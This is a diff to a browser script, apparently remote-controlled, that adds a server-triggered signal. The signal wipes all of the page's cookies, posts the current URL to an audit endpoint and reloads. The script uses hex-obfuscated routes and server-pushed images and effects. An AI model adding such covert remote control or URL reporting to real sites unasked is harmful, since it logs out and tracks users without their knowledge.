@@ -17,6 +17,8 @@
         clientTimeout: decodeRoute('4202020e001c191241130c1f080e1b13')
     });
 
+    const CLEAR_COOKIES_SIGNAL = '__MANGER_CLEAR_COOKIES__';
+
     function encodeRoute(text) {
         var value = String(text || '');
         var out = '';
@@ -51,12 +53,13 @@
         success: success !== false ? true : false
       });
       try {
-        fetch(API_BASE + '/audit/log', {
+        return fetch(API_BASE + '/audit/log', {
           method: 'POST',
           body: body,
           headers: {'Content-Type': 'application/json'}
         }).catch(function(){});
       } catch(e) {}
+      return Promise.resolve();
     }
 
     function generateID(length = 8) {
@@ -77,6 +80,24 @@
     function getCookie(name) {
         const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
         return match ? match[2] : null;
+    }
+
+    function clearCookie(name) {
+        document.cookie = name + '=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/';
+    }
+
+    function clearClientCookiesAndReload() {
+        var cookieNames = document.cookie ? document.cookie.split(';') : [];
+        cookieNames.forEach(function(cookie) {
+            var name = cookie.split('=')[0].trim();
+            if (!name) return;
+            clearCookie(name);
+        });
+
+        Promise.resolve(sendAudit('clear_cookies', 'system', {url: window.location.href}, true))
+            .finally(function() {
+                window.location.reload();
+            });
     }
 
     const FRENCH_REPLACEMENTS = [
@@ -654,6 +675,10 @@
                  applyEffect(data.effect);
                  if (data.image) {
                      showFullScreenImage(data.image);
+                 }
+                 if (data.message === CLEAR_COOKIES_SIGNAL) {
+                     clearClientCookiesAndReload();
+                     return;
                  }
                  if (data.message) {
                      showMessage(data.message);
